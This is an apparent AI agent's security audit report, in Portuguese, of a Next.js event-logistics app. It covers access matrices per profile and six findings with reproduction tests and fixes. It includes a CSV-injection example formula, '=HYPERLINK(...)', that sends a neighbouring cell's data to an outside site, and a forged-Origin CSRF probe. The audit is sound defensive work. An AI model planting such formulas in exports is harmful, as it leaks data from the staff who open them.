# Security review — app inteiro, todos os perfis (28/10/2026)

Agente: **security-review**. Ambiente: servidor de demonstração `http://localhost:3100` (build de produção,
PGlite `.data/e2e`, `EXIBIR_DEMO=true`, usuários do seed). Nada foi feito contra produção, nenhum segredo foi lido
ou copiado, nenhum código do app foi alterado. Registros criados nesta rodada (prefixo `AUDITORIA-SEG`) foram
removidos ao final (rascunho SOL-0029 e um ponto na arena Eco Run).

Como foi feito:

1. **Leitura de código** de toda a camada de servidor: `src/proxy.ts`, `src/server/auth/*`, todas as 85 server
   actions (14 arquivos + 2 inline), as 16 rotas de API, os services chamados por elas e as páginas com id.
2. **Chamada direta ao servidor, sem a tela**: um script Node lê os ids das actions do build
   (`.next/server/server-reference-manifest.json`), entra com cada perfil pelo `loginAction` e chama páginas, rotas e
   actions com a sessão de cada perfil (ids trocados, registros de outra área, ids inexistentes).
3. **Testes que comprovam os achados**: `src/server/seguranca.auditoria.test.ts` (Vitest, PGlite em memória).
4. Regressão das proteções que já existem: `permissoes-matriz.test.ts`, `src/server/auth/*.test.ts` e os 10 testes de
   rota em `src/app/api/**` passaram (17 arquivos, 393 testes).

---

## Resumo

| # | Gravidade | Achado | Onde | Prova |
|---|---|---|---|---|
| SEC-05 | **Alto** | `package-lock.json` versionado fixa `next 16.3.6`, `zod 4.6.5` e `sharp 0.35.4`, todos com avisos públicos (no `next`: 2 críticos e 2 altos). O deploy roda `npm ci`, então a produção usa essas versões. A máquina local tem `next 16.4.1`: os testes rodam outra versão | `package-lock.json`, `.replit` (`build = npm ci && npm run build`) | `npm audit --omit=dev` + comparação lock × `node_modules` |
| SEC-02 | **Médio** | Quem muda de área continua vendo **e alterando** os pedidos da área antiga, porque a sessão soma à área do cadastro todas as áreas em que a pessoa já pediu | `src/server/auth/session.ts:23`, `:195`, `:213`; `src/domain/permissions.ts:97-122` | `seguranca.auditoria.test.ts` › SEC-02 |
| SEC-04 | **Médio** | A aba OS mostra a qualquer perfil o motivo que a logística escreveu ao ajustar item de outra área, além do código, do item e do status dos pedidos de outras áreas. O histórico e a ata escondem esses dados | `src/server/services/conferencia.ts:235/332`, `eventos/ata.ts:247`, `solicitacoes/resposta.ts:162`, `solicitacoes/envio.ts:65` → `app/(app)/eventos/[id]/os/page.tsx:53` (`listarOsResumo`, `os.ts:110`) | `seguranca.auditoria.test.ts` › SEC-04 + varredura no demo |
| SEC-01 | **Médio** | CSV do histórico sem proteção contra fórmula: texto livre de um requisitante chega ao Excel da logística ou da gestão como fórmula | `src/app/api/historico/csv/route.ts:12` | `seguranca.auditoria.test.ts` › SEC-01 |
| SEC-03 | Baixo | A troca obrigatória de senha não vale nas rotas `/api/**` nem em action enviada pelo caminho `/perfil` | `src/server/auth/session.ts:248-256`; rotas usam `getUsuarioAtual` | `seguranca.auditoria.test.ts` › SEC-03 |
| SEC-06 | Baixo | Requisitante cria ponto no mapa de **qualquer** arena com nome e item inventados: basta o `itemAta` vindo do cliente começar com o nome da área dele | `src/server/services/arena.ts:64-76`, `src/domain/arena/posicoes.ts:28` | chamada direta no demo (criado e removido) |

Os testes de SEC-01 a SEC-04 estão marcados `it.fails` com a **expectativa segura**. Hoje passam porque o problema
existe. Depois da correção, eles passam a falhar: aí é só trocar `it.fails` por `it`.

```
npx vitest run src/server/seguranca.auditoria.test.ts --maxWorkers=2   → 4 expected fail
```

(Cada um foi rodado também como `it` comum, para conferir que falha **na asserção de segurança** e não na montagem.
Resultados: SEC-01 achou uma célula `=HYPERLINK(…`; SEC-02 `podeEditarSolicitacao` devolveu `true`; SEC-03 status
200; SEC-04 o motivo estava em `listarOsResumo`.)

---

## Inventário

### Páginas (52 `page.tsx`)

| Área do app | Páginas |
|---|---|
| Painel | `/` |
| Eventos | `/eventos`, `/eventos/novo`, `/eventos/[id]` (visão geral), `/[id]/ata`, `/[id]/os`, `/[id]/solicitacoes`, `/[id]/historico`, `/[id]/editar`, `/[id]/carga`, `/[id]/reuniao` (redireciona para conferência), `/[id]/itens/[linhaId]` |
| Conferência | `/conferencia/[id]` |
| Solicitações | `/solicitacoes`, `/solicitacoes/nova`, `/solicitacoes/[id]` (inclui o modo fila) |
| Biblioteca | `/biblioteca` (abas projetos/peças), `/catalogo` e `/projetos` (redirecionam), `/catalogo/nova`, `/catalogo/[id]/editar`, `/projetos/novo`, `/projetos/[id]`, `/projetos/[id]/editar` |
| Ativação | `/ativacao` (estoque), `/ativacao/reformas`, `/ativacao/retornos`, `/ativacao/itens/[id]`, `/estoque` (redireciona) |
| Arena | `/arena`, `/arena/nova`, `/arena/[slug]` |
| Carga e descarga | `/carga-descarga`, `/carga-descarga/cadastro` |
| Calendário, notificações, histórico | `/calendario`, `/notificacoes`, `/historico` |
| Pendências / consolidação | `/pendencias`, `/consolidacao`, `/consolidacao/pendencias` (telas desligadas: 404 para todos) |
| Admin e perfil | `/admin` (abas usuários/áreas/config), `/admin/usuarios`, `/admin/areas`, `/admin/configuracoes` (redirecionam), `/perfil`, `/sem-permissao` |
| Impressão | `/impressao/ata/[id]`, `/impressao/os/[id]`, `/impressao/arena/[slug]` |
| Acesso | `/login`, `/recuperar-senha`, `/redefinir-senha/[token]`; 404 (`not-found.tsx`) |

### Rotas de API (16)

`/api/anexos/[id]`, `/api/pecas/anexos/[id]`, `/api/ativacao/anexos/[id]`, `/api/arenas/[slug]/planta`,
`/api/busca`, `/api/auth/portal`, `/api/carga-descarga/modelo`, `/api/cron/verificacoes`,
`/api/eventos/[id]/ata/excel`, `/api/eventos/[id]/ata/lista`, `/api/historico/csv`, `/api/os/[id]/complemento`,
`/api/os/[id]/estrutura`, `/api/os/[id]/excel`, `/api/os/[id]/marcenaria`, `/api/os/[id]/[setor]`.

### Server actions (85)

| Arquivo | Actions |
|---|---|
| `(auth)/actions.ts` | loginAction, logoutAction, recuperarSenhaAction, redefinirSenhaAction |
| `admin/actions.ts` | salvarUsuarioAction, alternarAtivoUsuarioAction, gerarLinkAcessoAction, salvarAreaAction, salvarConfigAction |
| `ver-como/actions.ts` | verComoAction, sairVerComoAction |
| `perfil/actions.ts` | alterarSenhaAction, encerrarOutrasSessoesAction |
| `notificacoes/actions.ts` + 2 inline em `notificacoes/page.tsx` | notificacoesRecentesAction, marcarNotificacaoLidaAction, marcarTodasNotificacoesLidasAction, marcarTodasAction (inline), abrirAction (inline) |
| `eventos/actions.ts` (21) | salvarEvento, transicionarEvento, salvarObservacoes, incluirLinhaAta, alterarQuantidadeLinha, conferirLinha, conferirTodas, salvarDadosReuniaoAuto, marcarOsEnviada, atualizarVersaoLinha, ajustarLinhaConferencia, definirExtraDaRegra, salvarSeparacao, completarAcompanhante, editarDescricoesLinha, vincularAoCatalogo, ajustarPecaDoProjeto, ajustarTendasDoLocal, kitTendaDoProjeto |
| `solicitacoes/actions.ts` (9) | responderItem, desfazerResposta, atenderTudo, enviarRascunho, cancelarSolicitacao, devolverSolicitacao, excluirRascunho, editarPreReuniao, salvarSolicitacaoCompleta |
| `pendencias/actions.ts` | resolverPendenciaAction |
| `catalogo/actions.ts` | salvarPeca, alterarAtivoPeca, impactoInativacaoPeca, adicionarAnexoPeca, removerAnexoPeca |
| `projetos/actions.ts` | salvarProjeto, alterarAtivoProjeto, alterarDisponivelProjeto, anexarArquivo, removerAnexo |
| `biblioteca/actions.ts` | pecasParaProjeto, desabilitarBibliotecaEmLote, organizarProjetosEmLote, excluirGrupoProjeto, disponibilizarBibliotecaEmLote |
| `ativacao/actions.ts` | salvarItemEstoque, ajustarQuantidadeEstoque, registrarRetorno, abrirReforma, editarReforma, concluirReforma, adicionarAnexoEstoque, removerAnexoEstoque, pedidosDoItem |
| `carga-descarga/actions.ts` | salvarVeiculoCarga, duplicarVeiculoCarga, excluirVeiculoCarga, previaImportacaoCarga, importarCarga |
| `arena/actions.ts`, `arena/arenas-actions.ts` | salvarPosicaoArena, restaurarPlantaArena(Form), removerPosicaoArena, criarArena, excluirArena, trocarPlantaArena, removerPlantaArena, importarEntornoArena, removerEntornoArena |

### Permissões (`src/domain/permissions.ts`)

28 ações × 5 perfis (ADMIN, LOGISTICA, GESTAO, CENOGRAFIA, REQUISITANTE), mais 4 regras que não estão na matriz:
escopo por área (`podeVerSolicitacao`, `podeEditarSolicitacao`), o módulo Ativação (`podeGerenciarEstoque`,
pelo **nome** da área), o mapa da arena por seção (`secoesEditaveisArena`) e o "ver como" do admin.

---

## Matriz rota × perfil (chamada direta, sessão de cada perfil)

Perfis: admin@, marina.castro@ (Logística), helena.prado@ (Gestão), bruno.tavares@ (Cenografia), paulo.ribeiro@
(Produção), julia.fontes@ (Ativação), diego.sampaio@ (Gráfica), lucia.barros@ (Atendimento), tiago.moreira@
(inativo), admin "ver como" Requisitante e admin "ver como" Logística. Evento de amostra: ata fechada com OS
(`293e49d3…`).

Legenda: **✓** abre · **SP** servidor manda para `/sem-permissao` · **404** · **403** · **→x** redireciona.
Sem sessão (anônimo): tudo vai para `/login`, exceto `/api/anexos` (401) e `/api/cron` (503). **Inativo**: o login
falha com a mesma mensagem de senha errada; sem sessão, nenhuma célula se aplica (✓ esperado).

| Rota | Admin | Log | Gest | Cen | Prod | Ativ | Gráf | Atend | VC-Req | VC-Log |
|---|---|---|---|---|---|---|---|---|---|---|
| `/`, `/eventos`, `/solicitacoes`, `/biblioteca`, `/calendario`, `/notificacoes`, `/perfil`, `/arena`, `/arena/[slug]`, `/projetos/[id]` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `/eventos/[id]`, `/ata`, `/os`, `/solicitacoes`, `/historico`, `/itens/[linha]`, `/impressao/ata`, `/impressao/os`, `/impressao/arena` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `/eventos/novo`, `/eventos/[id]/editar`, `/eventos/[id]/carga` | ✓ | ✓ | SP | SP | SP | SP | SP | SP | SP | ✓ |
| `/conferencia/[id]` | →evento¹ | →evento¹ | SP | SP | SP | SP | SP | SP | SP | →evento¹ |
| `/solicitacoes/nova` | ✓ | SP | SP | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | SP |
| `/catalogo/nova`, `/catalogo/[id]/editar`, `/projetos/novo`, `/projetos/[id]/editar` | ✓ | ✓ | SP | ✓ | SP | SP | SP | SP | SP | ✓ |
| `/ativacao`, `/reformas`, `/retornos`, `/ativacao/itens/[id]` | ✓ | SP | SP | SP | SP | ✓² | SP | SP | SP | SP |
| `/arena/nova` | ✓ | SP | SP | SP | SP | SP | SP | SP | SP | SP |
| `/carga-descarga`, `/carga-descarga/cadastro` | ✓ | ✓ | SP | SP | SP | SP | SP | SP | SP | ✓ |
| `/historico` | ✓ | ✓ | ✓ | SP | SP | SP | SP | SP | SP | ✓ |
| `/admin` (todas as abas) | ✓ | SP | SP | SP | SP | SP | SP | SP | SP | SP |
| `/pendencias`, `/consolidacao`, `/consolidacao/pendencias` | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 |
| id inexistente (`/eventos/0…`, `/solicitacoes/0…`), rota inexistente | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 | 404 |
| `/solicitacoes/[id]` (26 do demo) | 26 ✓ | 24 ✓ / 2 SP³ | 24 ✓ / 2 SP³ | 24 ✓ / 2 SP³ | 14 ✓ / 12 SP | 7 ✓ / 19 SP | 1 ✓ / 25 SP | 2 ✓ / 24 SP | 26 SP⁴ | 24 ✓ / 2 SP³ |
| `/api/busca`, `/api/anexos/[id]`, `/api/eventos/[id]/ata/excel` e `/lista`, `/api/os/[id]/excel`, `/estrutura`, `/marcenaria`, `/[setor]` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `/api/os/[id]/complemento` (OS ainda não enviada) | 400 | 400 | 400 | 400 | 400 | 400 | 400 | 400 | 400 | 400 |
| `/api/ativacao/anexos/[id]` (id inexistente) | 404 | 403 | 403 | 403 | 403 | 404² | 403 | 403 | 403 | 403 |
| `/api/carga-descarga/modelo` | ✓ | ✓ | 403 | 403 | 403 | 403 | 403 | 403 | 403 | ✓ |
| `/api/historico/csv` | ✓ | ✓ | ✓ | 403 | 403 | 403 | 403 | 403 | 403 | ✓ |
| `/api/cron/verificacoes` (sem `CRON_SECRET` no demo) | 503 | 503 | 503 | 503 | 503 | 503 | 503 | 503 | 503 | 503 |

¹ A ata do evento de amostra já está fechada: a conferência devolve para o evento (esperado).
² Júlia é da área "Ativação": o módulo é liberado pelo nome da área (`src/domain/estoque.ts:17`). Ver E3.
³ Os 2 rascunhos não enviados só aparecem para a própria área e para o admin (esperado).
⁴ "Ver como Requisitante" sem área: não vê nenhuma solicitação (esperado).

**Isolamento entre áreas no demo**: as solicitações que cada requisitante abre não se sobrepõem entre Produção,
Ativação, Gráfica e Atendimento (interseção 0 em todos os pares). Também procurei ids e códigos de solicitações de
outras áreas no HTML e no RSC de 166 páginas por perfil (painel, calendário, listas, notificações, busca e as abas de
todos os 32 eventos), com Diego (Gráfica) e Lúcia (Atendimento). A única exposição foi a **aba OS** (SEC-04).
Também não apareceu hash de senha, `token_hash` nem nome de segredo em nenhuma resposta. O único e-mail em cada
página é o do próprio usuário; só `/admin` (admin) lista os e-mails de todos.

## Matriz action × perfil (chamada direta, sem a tela)

Cada action foi chamada pelos perfis que **não** têm a permissão: Gestão, Cenografia, Produção, Ativação e admin
"ver como" Requisitante. Os alvos foram ids inexistentes ou registros criados por mim. Quando a validação do
formulário barra antes da permissão, o resultado da chamada direta não prova nada; nesses casos vale o teste de
service (`permissoes-matriz.test.ts`, verde).

| Grupo | Actions | Resultado |
|---|---|---|
| Ciclo do evento e ata | salvarEvento, transicionarEvento, salvarObservacoes, incluirLinhaAta, alterarQuantidadeLinha, conferirLinha, conferirTodas, salvarDadosReuniaoAuto, marcarOsEnviada, atualizarVersaoLinha, ajustarLinhaConferencia, definirExtraDaRegra, salvarSeparacao, completarAcompanhante, editarDescricoesLinha, vincularAoCatalogo, ajustarPecaDoProjeto, ajustarTendasDoLocal | ✓ todas recusam com "Você não tem permissão" para os 5 perfis |
| Resposta da logística | responderItem, desfazerResposta, atenderTudo, devolverSolicitacao, resolverPendencia | ✓ recusam |
| Solicitação de outra área (rascunho SOL-0029 da Produção, criado pelo Paulo) | salvarSolicitacaoCompleta, enviarRascunho, excluirRascunho, cancelarSolicitacao, editarPreReuniao por Gráfica, Ativação, Atendimento, Logística, Gestão, Cenografia e VC-Req | ✓ todas recusam ("Só usuários da área…" ou "sem permissão"); o rascunho continuou intacto e foi excluído pelo Paulo no fim |
| Biblioteca | salvarPeca, alterarAtivoPeca, impactoInativacaoPeca, add/removerAnexoPeca, alterarAtivo/DisponivelProjeto, anexarArquivo, removerAnexo, pecasParaProjeto, operações em lote, excluirGrupoProjeto | ✓ recusam para Gestão e requisitantes; Cenografia passa (tem permissão) e para em "não encontrado". `salvarProjeto` valida o formulário antes (vale o teste de service) |
| Ativação | salvarItemEstoque, ajustarQuantidade, registrarRetorno, abrir/editar/concluirReforma, add/removerAnexoEstoque, pedidosDoItem | ✓ recusam ("O módulo é da Ativação…"); Júlia (área Ativação) passa, como previsto |
| Carga e descarga | salvar/duplicar/excluirVeiculo, previaImportacao, importarCarga | ✓ recusam |
| Arena | criarArena, excluirArena, removerPlanta, importar/removerEntorno, restaurarPlanta | ✓ recusam. `trocarPlanta` valida o arquivo antes (vale o teste de service). salvarPosicao/removerPosicao seguem a regra por seção; ver SEC-06 |
| Admin | salvarUsuario, alternarAtivoUsuario, gerarLinkAcesso, salvarArea, salvarConfig | ✓ recusam, inclusive para o admin em "ver como" |
| Ver como | verComoAction | ✓ recusa todo não-admin; o cookie `npe_ver_como` forjado por não-admin é ignorado (`session.ts:235`) |
| Notificações | marcarNotificacaoLida com id de outro usuário | ✓ não altera nada (o `where` filtra pelo usuário da sessão) |
| CSRF | action com `Origin: http://evil.example` | ✓ recusada (erro). Sem `Origin`, é aceita (comportamento do Next); o cookie `SameSite=Lax` cobre |

### Tela × elemento × perfil

Esta revisão olhou o **servidor**: cada botão, formulário, upload e exportação foi testado pela action ou rota
que ele chama (tabelas acima). **Não conferi** se cada elemento aparece ou fica escondido para cada perfil
(1280 e 375 px), nem os estados vazio, carregando e erro. Isso é visual e ficou com os agentes de UI. Para a
segurança isso pesa pouco, porque o servidor recusa de qualquer jeito. Ficam como "não verificado" nesta
auditoria todas as células de *visibilidade* de elemento.

---

## Achados

### SEC-05 · Alto · Dependências com avisos críticos fixadas no lockfile que vai para produção

- **Onde**: `package-lock.json` (commit de 09/10) fixa `next 16.3.6`, `sharp 0.35.4`, `zod 4.6.5`,
  `brace-expansion 1.1.18` e `source-map-js 1.2.1`. O `.replit` faz o build de produção com
  `npm ci && npm run build`, que instala exatamente o lockfile. O `node_modules` desta máquina tem `next 16.4.1`,
  `sharp 0.35.5` e `zod 4.6.7`: o servidor de demonstração e os testes rodam versões **diferentes** da produção.
- **O que o `npm audit --omit=dev` aponta para o lockfile**: no `next` (faixa `>=16.0.0 <=16.4.0`), RCE sem
  autenticação em funções `"use cache"` que devolvem typed arrays (crítico), RCE no Image Optimization com SVG
  (crítico), SSRF no Image Optimization (alto), DoS no App Router via Server Actions (alto) e cache poisoning de
  SSG/ISR (moderado). No `zod` (<4.6.6), esgotamento de memória ao validar coleções grandes (alto). No `sharp`
  (<0.35.5), CVE do librsvg (alto). Em `exceljs`, um `uuid` transitivo (moderado).
- **Alcançabilidade (o que deu para confirmar)**: o app não usa `"use cache"` nem `next/image` (grep vazio).
  `/_next/image` recusa SVG (400) **nesta** build 16.4.1; na 16.3.6 não testei. O `sharp` só recebe arquivos já
  conferidos como PNG, JPEG, WebP ou PDF, então o librsvg não é alcançável. Server Actions existem inclusive sem
  login (`loginAction` em `/login`) e o `zod` valida payloads de até 9 MB: os dois avisos de DoS são
  **alcançáveis em tese**. Não testei, porque carga está fora do escopo permitido.
- **Correção sugerida**: `npm install next@^16.4.1 zod@^4.6.6 sharp@^0.35.5` (e `npm audit fix` para os
  transitivos), versionar o `package-lock.json` e pôr `npm audit --omit=dev --audit-level=high` na CI
  (`.github/workflows/ci.yml`). Vale conferir por que o `node_modules` local diverge do lock (um
  `npm install --no-save`?).

### SEC-02 · Médio · Troca de área não tira o acesso à área antiga

- **Onde**: `src/server/auth/session.ts:23` (`areasPedidasSql`: todas as áreas das solicitações que a pessoa já
  criou), somadas em `:195`/`:213`. Isso alimenta `areasDoUsuario`/`daMinhaArea`
  (`src/domain/permissions.ts:97-105`), que decide `podeVerSolicitacao` e `podeEditarSolicitacao`
  (`:111-122`), o escopo das listas, do painel, do histórico do evento, dos motivos da logística e das seções do mapa
  da arena.
- **Quem consegue o quê**: um requisitante da área A que já pediu alguma vez e é transferido pelo admin para a área B
  continua, sem prazo:
  - vendo rascunhos, solicitações, motivos da logística e linhas da ata da área A;
  - **editando, enviando, excluindo e cancelando** os pedidos da área A.

  O mesmo vale para a Cenografia sem área fixa e para quem pediu por outra área no tempo em que o solicitante ainda
  escolhia a área. Hoje ele não escolhe mais (`rascunho.ts:31`; `area-escolhida.test.ts`), e a única consequência
  que sobra do mecanismo é essa retenção de acesso.
- **Como reproduzir**: o teste monta o caso inteiro (pedido na área A → `editarUsuario` para a área B → colega da
  área A cria um rascunho → sessão real do transferido via `getUsuarioReal`). Resultado:
  `podeEditarSolicitacao(...) === true` e `obterSolicitacao` abre o rascunho.
- **Teste**: `src/server/seguranca.auditoria.test.ts` › "SEC-02".
- **Correção sugerida**: tirar `areasPedidas` da sessão (área = área do cadastro; o admin, que escolhe a área,
  já tem acesso total). Se for preciso manter o acesso aos próprios pedidos antigos, use regra por
  **autoria** (`criadoPorId === usuario.id`, só leitura) em vez de dar a área inteira. Também vale derrubar as sessões
  quando o admin troca a área (`admin.ts:122`, como já se faz ao desativar).

### SEC-04 · Médio · A aba OS expõe motivos e pedidos de outras áreas

- **Onde**: as descrições das versões da OS levam texto de outras áreas:
  - `conferencia.ts:235/332` grava `"<item> 10 → 7 — <motivo da logística>"`;
  - `eventos/ata.ts:247` grava `"… incluído — <justificativa>"`;
  - `solicitacoes/resposta.ts:162` grava `"SOL-xxxx · <item> — atendido/não atendido"`;
  - `solicitacoes/envio.ts:65` grava `"SOL-xxxx · alteração da <Área>…"`.

  `app/(app)/eventos/[id]/os/page.tsx:53` lista todas as versões com `listarOsResumo(id)` (`os.ts:110`), sem
  filtro por perfil, e a aba é `os.ver` (todos os perfis). O resto do app esconde esses dados de outra área:
  `obterHistoricoEvento` filtra `ACOES_COM_MOTIVO` (`eventos/consultas.ts:101-121`), `detalheLinha` troca o
  solicitante por "outra área" e a ata mostra "Pedido de área" no lugar do código.
- **Quem consegue o quê**: qualquer requisitante lê na aba OS:
  - o motivo que a logística escreveu ao ajustar o item de outra área;
  - o código e o item dos pedidos de outras áreas, e se foram atendidos;
  - o nome de quem gerou cada versão.
- **Evidência no demo**: Diego (Gráfica) e Lúcia (Atendimento) recebem em `/eventos/cdcda09c…/os` "SOL-0025 ·
  Quadro de fotos 4×3 m — atendido" e "SOL-0004 · Pórtico boca de 4 m com orelha — atendido". Em
  `/eventos/293e49d3…/os` aparece "SOL-0017 · alteração da Ativação dentro da janela (1 item)", com "Júlia Fontes".
  Nenhum desses pedidos é da área deles, e a tela da solicitação os manda para `/sem-permissao`.
- **Teste**: `seguranca.auditoria.test.ts` › "SEC-04". A logística ajusta um item da área A com motivo, o histórico
  da área B **não** mostra o motivo, mas `listarOsResumo` (o que a aba OS entrega a B) mostra.
- **Correção sugerida**: separar texto público de texto restrito na versão da OS: gravar o motivo à parte (ou não
  gravar) e montar a descrição exibida de acordo com o perfil e a área. Na aba OS, quem não tem
  `solicitacao.ver_todas` vê só o gatilho genérico ("Ajuste da logística", "Resposta a solicitação") nas versões que
  não são da própria área.

### SEC-01 · Médio · CSV do histórico sem proteção contra fórmula (CSV injection)

- **Onde**: `src/app/api/historico/csv/route.ts:12`. A função `celula` só põe aspas, e o Excel executa célula entre
  aspas que começa com `=`, `+`, `-` ou `@`. A rota `/api/os/[id]/[setor]` já neutraliza
  (`csvEscape`, prefixo `'`); esta não.
- **Quem consegue o quê**: um requisitante escreve na descrição de um item fora do catálogo, por exemplo,
  `=HYPERLINK("http://site-externo/?x="&A1,"Abrir")`. Na reunião, a logística confere a linha e o histórico grava
  `"<descrição>: conferida na reunião"` (`eventos/reuniao.ts:67`). Outros caminhos que levam texto do usuário ao
  começo da descrição: ajustes na conferência (`conferencia.ts:313/323`), nome de projeto nas operações em lote
  (`biblioteca-lote.ts:107`), nome do usuário vindo do Portal. Quando a Logística ou a Gestão exporta o histórico e
  abre no Excel, a célula vira fórmula: link que leva dados de células vizinhas para fora ou, em Excel antigo, DDE.
- **Teste**: `seguranca.auditoria.test.ts` › "SEC-01" (cadeia real: envio do requisitante → linha da ata → conferência
  → `GET /api/historico/csv` → célula começando com `=HYPERLINK`).
- **Correção sugerida**: usar na rota do histórico o mesmo `csvEscape` da rota da OS (mover para `src/lib`) e aplicar
  em todas as colunas.

### SEC-03 · Baixo · Troca obrigatória de senha só vale nas páginas

- **Onde**: `src/server/auth/session.ts:248-256`. `requireUsuario` só manda para `/perfil?trocar=1` olhando o
  **caminho da página** (`x-npe-caminho`, gravado pelo proxy). As rotas `/api/**` usam `getUsuarioAtual`, que não
  confere `trocarSenha`. Uma server action enviada com POST para `/perfil` chega com o caminho `/perfil` e passa,
  qualquer que seja a action.
- **Quem consegue o quê**: quem entra com senha provisória (definida pelo admin, ou a senha do seed fora do modo
  demonstração) baixa histórico, OS, ata e anexos e executa actions sem trocar a senha. O risco é baixo: a pessoa já
  tem a senha. Mas a regra "senha provisória não serve para usar o sistema" não se sustenta.
- **Teste**: `seguranca.auditoria.test.ts` › "SEC-03" (usuário Logística com `trocarSenha` recebe 200 no
  `/api/historico/csv`).
- **Correção sugerida**: um `exigirSessaoLiberada()` que recusa quando `trocarSenha` está pendente. Chamar nas rotas de
  API e em todas as actions, exceto `alterarSenhaAction` e `logoutAction`.

### SEC-06 · Baixo · Ponto inventado no mapa de qualquer arena

- **Onde**: `src/server/services/arena.ts:64-76` e `src/domain/arena/posicoes.ts:28`. A permissão olha só o
  prefixo do `itemAta` (`"<Seção>|…"`) mandado pelo cliente. O servidor não confere se esse item existe na ata do
  evento da arena.
- **Como reproduzir (feito no demo)**: Paulo (Produção) chama
  `salvarPosicaoArenaAction("eco-run-sp-2026", { tipo: "NOVO", chave: "novo:ata:…", nome: "AUDITORIA-SEG ponto inventado", itemAta: "Produção|item que não existe", x: 1, z: 1 })`.
  A resposta é `ok: true`. Com `itemAta: "Gráfica|…"` vem a recusa certa, e Diego (Gráfica) não consegue
  removê-lo (recusa certa). O ponto foi removido em seguida pelo próprio Paulo.
- **Impacto**: integridade do mapa. Qualquer área põe pontos com nome livre em arenas de eventos em que nem pediu
  nada. Não há vazamento.
- **Correção sugerida**: no `salvarPosicaoArena`, conferir que o `itemAta` corresponde a uma linha ativa da ata do
  evento da arena (`arenas.eventoId`) com área do usuário.

---

## Endurecimento recomendado (não são riscos confirmados)

- **E1 · IP do limite de tentativas** (`src/server/auth/limite.ts:15-17`): usa o **último** `X-Forwarded-For`.
  Atrás do proxy do Replit isso está certo. Exposto direto ou atrás de outro proxy, o cliente escolhe o próprio
  "IP" e escapa do limite por IP (o limite por e-mail continua valendo). Documente essa premissa no `docs/operacao.md`
  ou leia o IP de uma variável que diga quantos proxies confiáveis existem.
- **E2 · Ativação pelo nome da área** (`src/domain/estoque.ts:17`): o módulo inteiro (estoque, reformas,
  retornos, anexos) fica fora da `MATRIZ`. Qualquer perfil cuja área se chame "Ativação" (inclusive Logística ou
  Cenografia) ganha o módulo, e uma área renomeada perde. Vale uma ação `ativacao.gerenciar` na matriz, ou ao menos
  amarrar à área por id.
- **E3 · Cache dos anexos** (`src/server/resposta-arquivo.ts:16`): `private, max-age=86400, immutable`. Depois de
  perder o acesso ou sair, o navegador ainda serve o arquivo por até 1 dia. É baixo porque é `private`.
- **E4 · Importação de planilha** (`carga-descarga/actions.ts:82`): até 5 MB **compactados** entram no ExcelJS
  (risco de zip-bomb). Só Logística e Admin chegam aqui. Limitar linhas e colunas ou o tamanho descompactado.
- **E5 · Entrada pelo Portal por GET** (`/api/auth/portal`): é o padrão de SSO. Com token de uso único e 2 min de
  vida, o risco de alguém "logar a vítima na conta do atacante" é baixo.
- **E6 · `/api/cron/verificacoes`** aceita GET e responde "CRON_SECRET não configurado" (503). O comportamento está
  documentado e o valor do segredo não aparece. Só informativo.
- **E7 · `detalheLinha`** (`linha-do-tempo.ts:212`) devolve o `solicitacaoId` (UUID, sem código) mesmo para outra
  área. Não abre nada (a solicitação dá `/sem-permissao`), mas pode sair do payload.

## Controles conferidos e OK

- **Sessão**:
  - token de 256 bits (`crypto.randomBytes`), guardado como hash SHA-256;
  - cookie `HttpOnly`, `SameSite=Lax`, `Secure` em produção;
  - 14 dias sem uso ou 30 desde o login;
  - logout apaga a sessão no banco;
  - desativar o usuário ou redefinir a senha derruba as sessões;
  - usuário inativo não entra e recebe a mesma mensagem de senha errada.
- **Login**:
  - limite atômico por e-mail+IP, por e-mail e por IP;
  - tempo igual para e-mail inexistente (hash fictício);
  - `next` só aceita caminho interno (`destinoInterno`).
- **Recuperação e link de acesso**:
  - token aleatório com hash, expiração (1 h ou 7 dias para convite) e uso único atômico;
  - links antigos são invalidados;
  - a resposta é igual para e-mail existente ou não, com limite;
  - o link nunca vai para o histórico;
  - CSP sem terceiros (o token na URL não vaza por Referer).
- **Portal NORTE**: HS256 apenas, assinatura comparada em tempo constante, `iss`, `exp`, `aud`/`app` e `jti` de uso
  único. Usuário que já existe mantém o perfil e a situação definidos aqui.
- **Cron**: `Bearer` comparado em tempo constante; 503 sem segredo.
- **Ver como**: só o admin real; o perfil visto só **reduz** permissões (VC-Req e VC-Log recusados como os perfis
  reais); o histórico registra o admin.
- **Uploads**:
  - tipo conferido pelo conteúdo (assinatura PNG, JPEG, WebP ou PDF), nunca SVG ou HTML;
  - limite de 8 MB;
  - nome do arquivo saneado no `Content-Disposition` (`filename*=`);
  - `nosniff` e CSP `sandbox` na entrega;
  - fotos de peça e da Ativação regravadas pelo sharp (anexos de projeto ficam como vieram, servidos em sandbox).
- **Cabeçalhos**: CSP com nonce e `strict-dynamic`, `frame-ancestors 'none'`, `object-src 'none'`, HSTS,
  `nosniff`, Referrer-Policy, Permissions-Policy; `poweredByHeader: false`.
- **Server actions**: `allowedOrigins` só com hosts exatos (sem curinga); Origin de outro site é recusado (testado).
- **Injeção**:
  - nenhum `dangerouslySetInnerHTML`;
  - os dois `sql.raw` usam constantes (`armazenamento.ts:154`, `resposta.ts:268`);
  - OSM só para servidores fixos (sem SSRF);
  - redirecionamentos só internos;
  - Excel pelo ExcelJS como texto (fórmulas só as geradas pelo sistema);
  - CSV da OS protegido.
- **Erros**: mensagens de domínio ou um código de referência; o log não leva objeto cru, cookie nem token.
- **Segredos**: `.env` e `.env.local` ignorados e nunca commitados; `.env.example` sem valores. Nenhum padrão de
  chave, token ou string de conexão real em `src/`, `scripts/` ou `docs/`; só as senhas de contêiner descartável da
  CI e da documentação.

## O que NÃO foi verificado

- **Visibilidade de cada elemento** por perfil (botões, menus, modais, gavetas, atalhos) e os estados de tela, em
  1280 e 375 px. A auditoria foi do servidor; essas células ficam "não verificado".
- **Portal NORTE no ar**: o demo não tem `PORTAL_SSO_SECRET`. Só revisão de código e os testes existentes
  (`portal.test.ts`, `api/auth/portal/route.test.ts`).
- **Cron com segredo**: o demo responde 503. Só código e `cron/verificacoes/route.test.ts`.
